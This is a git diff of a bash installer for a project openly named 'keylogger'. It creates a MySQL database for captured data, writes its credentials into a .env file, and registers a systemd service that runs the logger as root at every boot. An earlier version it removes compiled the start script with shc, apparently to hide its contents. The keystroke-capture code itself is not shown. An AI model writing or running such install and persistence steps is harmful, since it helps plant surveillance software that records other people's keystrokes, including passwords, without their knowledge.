@@ -1,9 +1,9 @@
 #!/bin/bash
 
-# Check depencencies
+# Check dependencies
 # from https://stackoverflow.com/a/52552095
 echo -n "Checking dependencies... "
-for name in python3 mysql shc pipenv
+for name in python3 mysql pipenv
 do
   [[ $(which $name 2>/dev/null) ]] || { echo -en "\n$name needs to be installed.";deps=1; }
 done
@@ -31,30 +31,39 @@ GRANT ALL PRIVILEGES ON keylogger.* TO '$user'@'$host';
 " > autoconfig.sql;
 
 clear;
+echo "Config mysql database...";
 echo "Access your mysql user with privileges for create a new user:";
 echo "Your user:";
 read root_user;
 mysql -u $root_user -p < autoconfig.sql;
 rm autoconfig.sql;
-echo "MYSQL_CONFIG = {\"user\": \"$user\", \"password\": \"$password\", \"host\": \"$host\", \"database\": \"keylogger\"}" > .env;
 
-# Set directory of libs
+echo "Set environment variables";
+echo "MYSQL_CONFIG={\"user\": \"$user\", \"password\": \"$password\", \"host\": \"$host\", \"database\": \"keylogger\"}" > .env;
 echo "PYTHONPATH='lib/'" >> .env
 
 # Install python dependencies
-pipenv --quiet sync;
+echo "Install python dependencies...";
+sudo pipenv sync;
 
 # Config autostart
-path="${PWD}/bin/runner.py";
-echo "#!/bin/sh" > start_keylogger.sh;
-echo "exec pipenv shell & sudo pipenv run python3 $path & exit &" >> start_keylogger.sh;
+echo "Config autostart service...";
+echo "
+[Unit]
+Description=Keylogger
 
-chmod +x start_keylogger.sh;
-shc -f start_keylogger.sh -o keylogger;
-rm start_keylogger.sh;
-sudo mv keylogger /bin/;
-sudo mv keylogger.service /etc/systemd/system/;
-systemctl enable keylogger.service;
-systemctl start keylogger.service;
+[Service]
+RemainAfterExit=yes
+User=root
+WorkingDirectory=${PWD}
+ExecStart=sudo pipenv run python3 bin/runner.py
 
-echo "\nKeylogger status: $(systemctl is-active keylogger.service)";
+[Install]
+WantedBy=multi-user.target
+" > keylogger_v2.service;
+
+sudo mv keylogger_v2.service /etc/systemd/system/;
+sudo systemctl enable --now keylogger_v2.service;
+
+echo "Finish";
+echo "check: systemctl status keylogger.service";
